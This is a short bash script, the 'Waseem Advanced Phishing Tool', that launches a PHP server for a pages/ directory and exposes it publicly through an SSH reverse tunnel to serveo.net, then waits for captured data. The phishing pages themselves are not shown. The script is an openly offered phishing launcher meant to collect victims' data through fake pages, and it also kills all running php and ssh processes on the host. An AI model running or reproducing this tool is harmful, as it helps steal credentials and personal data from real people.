#!/bin/bash
# Waseem Advanced Phishing Tool

# Kill previous instances to avoid errors
killall php > /dev/null 2>&1
killall ssh > /dev/null 2>&1

clear
echo "####################################"
echo "#      WASEEM ADVANCED TOOL        #"
echo "####################################"
echo ""
echo "[1] Localhost (Only for testing)"
echo "[2] Serveo (Public Link)"
echo "[3] Exit"
echo ""
read -p "Select an option: " option

if [ $option == 1 ]; then
    echo "[*] Starting Local Server on 127.0.0.1:8080..."
    php -S 127.0.0.1:8080 -t pages/
elif [ $option == 2 ]; then
    echo "[*] Starting Local Server..."
    php -S 127.0.0.1:8080 -t pages/ > /dev/null 2>&1 &
    echo "[*] Starting Serveo Tunneling..."
    ssh -R 80:127.0.0.1:8080 serveo.net
elif [ $option == 3 ]; then
    echo "Exiting..."
    exit
else
    echo "Invalid option!"
fi

echo "[*] Waiting for data..."
